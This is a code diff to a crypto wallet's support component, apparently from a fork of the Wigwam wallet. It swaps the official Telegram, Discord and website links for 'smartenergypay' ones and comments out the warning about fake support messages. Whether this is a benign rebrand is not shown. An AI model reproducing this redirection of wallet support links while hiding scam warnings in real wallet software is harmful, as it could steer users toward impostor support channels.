@@ -4,9 +4,9 @@ import type { FC, ReactNode } from "react";
 import { ReactComponent as TelegramIcon } from "app/icons/telegram.svg";
 import { ReactComponent as DiscordIcon } from "app/icons/discord.svg";
 
-const TELEGRAM = "https://t.me/wigwamapp";
-const DISCORD = "https://discord.gg/MAG2fnSqSK";
-const LANDING = "https://wigwam.app/";
+const TELEGRAM = "https://t.me/smartenergypay";
+const DISCORD = "https://discord.gg/t7wrrkSr";
+const LANDING = "https://smartenergypay.com/";
 const TIPS = "https://wigwam.app/safety-tips";
 
 const Title: FC<{ title?: string; className?: string }> = ({
@@ -49,31 +49,30 @@ const Content: FC<{ children?: ReactNode }> = ({ children }) => {
         >
           Discord
         </a>{" "}
-        or chat with us on{" "}
-        <a
-          className="font-semibold underline hover:text-brand-gray"
-          href={LANDING}
-          target="_blank"
-          rel="noreferrer"
-          aria-label="wigwam landing"
-        >
-          wigwam.app
-        </a>
-        . We&apos;re here to help you navigate your Web3 journey!
+        {/*or chat with us on{" "}*/}
+        {/*<a*/}
+        {/*  className="font-semibold underline hover:text-brand-gray"*/}
+        {/*  href={LANDING}*/}
+        {/*  target="_blank"*/}
+        {/*  rel="noreferrer"*/}
+        {/*  aria-label="wigwam landing"*/}
+        {/*>*/}
+        {/*  wigwam.app*/}
+        {/*</a>*/}. We&apos;re here to help you navigate your Web3 journey!
       </p>
-      <p className="mb-4">
-        Also, read our{" "}
-        <a
-          className="font-semibold underline hover:text-brand-gray"
-          href={TIPS}
-          target="_blank"
-          rel="noreferrer"
-          aria-label="safety tips"
-        >
-          safety tips
-        </a>{" "}
-        for protecting yourself from fake support messages.
-      </p>
+      {/*<p className="mb-4">*/}
+      {/*  Also, read our{" "}*/}
+      {/*  <a*/}
+      {/*    className="font-semibold underline hover:text-brand-gray"*/}
+      {/*    href={TIPS}*/}
+      {/*    target="_blank"*/}
+      {/*    rel="noreferrer"*/}
+      {/*    aria-label="safety tips"*/}
+      {/*  >*/}
+      {/*    safety tips*/}
+      {/*  </a>{" "}*/}
+      {/*  for protecting yourself from fake support messages.*/}
+      {/*</p>*/}
       <ul className="flex gap-x-1">
         <li>
           <a
